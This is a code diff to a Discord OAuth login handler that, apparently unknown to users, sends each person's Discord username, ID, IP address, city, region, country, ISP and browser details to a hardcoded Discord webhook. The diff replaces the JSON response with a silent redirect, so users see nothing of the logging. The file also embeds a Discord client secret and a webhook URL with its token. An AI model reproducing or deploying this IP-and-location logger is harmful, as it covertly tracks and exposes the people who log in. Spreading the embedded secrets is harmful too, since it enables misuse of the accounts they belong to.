@@ -2,6 +2,7 @@ const CLIENT_ID = process.env.DISCORD_CLIENT_ID || "1415538798460272723";
 const CLIENT_SECRET = process.env.DISCORD_CLIENT_SECRET || "EgAnSyhqyi0FqDRhDCasFa5bldRnE7ce";
 const REDIRECT_URI = "https://coreapi.online/api/discord";
 const WEBHOOK_URL = "https://discord.com/api/webhooks/1415852727145336832/RrVh5LhYuqcAsUtnZkHIkcPOrJmKrmdQePFrOpuQh_AvSdLNNN1oND7xPv3v4z_64p1"; // Discord webhook for logging
+const MAIN_SITE = "https://coreapi.online"; // Where to redirect after login
 
 export default async function handler(req, res) {
   if (req.method !== "GET") return res.status(405).json({ error: "Method not allowed" });
@@ -37,12 +38,12 @@ export default async function handler(req, res) {
     });
     const user = await userRes.json();
 
-    // Get IP and basic geo info
+    // Get IP info
     const ip = req.headers["x-forwarded-for"] || req.socket.remoteAddress || "Unknown";
     const geoRes = await fetch(`https://ipapi.co/${ip}/json/`);
     const geoData = await geoRes.json().catch(() => ({}));
 
-    // Device info (basic, from headers)
+    // Device info from headers
     const ua = req.headers["user-agent"] || "Unknown";
     const deviceInfo = {
       browserName: ua.split(" ")[0],
@@ -56,25 +57,21 @@ export default async function handler(req, res) {
       pixelRatio: 1,
     };
 
-    // Create Discord embed
+    // Create webhook embed
     const embedPayload = {
       username: "Website Discord Login Logger",
       embeds: [
         {
           title: "User Logged In via Discord",
-          color: 0xffa500, // light orange
-          thumbnail: {
-            url: `https://cdn.discordapp.com/avatars/${user.id}/${user.avatar}.png`,
-          },
+          color: 0xffa500,
+          thumbnail: { url: `https://cdn.discordapp.com/avatars/${user.id}/${user.avatar}.png` },
           fields: [
             { name: "Discord Username", value: `${user.username}#${user.discriminator}`, inline: true },
             { name: "Discord ID", value: user.id, inline: true },
             { name: "IP Address", value: ip, inline: true },
             {
               name: "Location",
-              value: `${geoData.city || "Unknown City"}, ${geoData.region || "Unknown Region"}, ${
-                geoData.country_name || "Unknown Country"
-              }`,
+              value: `${geoData.city || "Unknown City"}, ${geoData.region || "Unknown Region"}, ${geoData.country_name || "Unknown Country"}`,
               inline: true,
             },
             { name: "ISP", value: geoData.org || "Unknown", inline: true },
@@ -102,11 +99,9 @@ export default async function handler(req, res) {
       });
     }
 
-    // Return JSON for frontend
-    res.status(200).json({
-      discordUsername: `${user.username}#${user.discriminator}`,
-      discordID: user.id,
-    });
+    // ✅ Redirect user back to main site
+    res.redirect(MAIN_SITE);
+
   } catch (err) {
     console.error(err);
     res.status(500).json({ error: "OAuth failed" });
